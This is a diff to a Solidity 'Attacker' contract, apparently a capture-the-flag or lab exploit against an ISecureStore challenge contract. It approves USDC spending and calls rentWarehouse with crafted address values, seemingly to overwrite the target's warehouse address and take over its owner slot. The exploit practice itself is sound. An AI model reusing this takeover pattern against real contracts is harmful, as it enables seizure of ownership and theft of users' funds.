@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.13;
 import "hardhat/console.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 interface ISecureStore {
     function owner() external view returns (address);
@@ -12,17 +13,21 @@ contract Attacker {
     
     address public warehouse;
     address public owner;
+    address public USDC;
 
-    function changeWHAddress(ISecureStore target) external payable {
-        target.rentWarehouse{value: msg.value}(1, uint256(uint160(address(this))));
-        // (bool success, ) = payable(address(target)).call{value: 500000}(
-        //     abi.encodeWithSignature("rentWarehouse(uint256,uint256)",1,uint256(uint160(address(this)))));
-        // require(success, "Payable function call failed.");
+    constructor(address _USDC) {
+        USDC = _USDC;
     }
 
-    function changeOwner(ISecureStore target) external payable {
-        target.rentWarehouse{value: msg.value}(1, uint256(uint160(msg.sender)));
-       // target.rentWarehouse(1, uint256(uint160(msg.sender))){value: target.pricePerDay()};
+    function changeWHAddress(ISecureStore target) external {
+        console.log("Balalnceo f this contract", IERC20(USDC).balanceOf(address(this)));
+        IERC20(USDC).approve(address(target), type(uint256).max);
+        target.rentWarehouse(1, uint256(uint160(address(this))));
+
+    }
+
+    function changeOwner(ISecureStore target) external {
+        target.rentWarehouse(1, uint256(uint160(msg.sender)));
     }
 
     function setSSN(uint256 _owner) external {
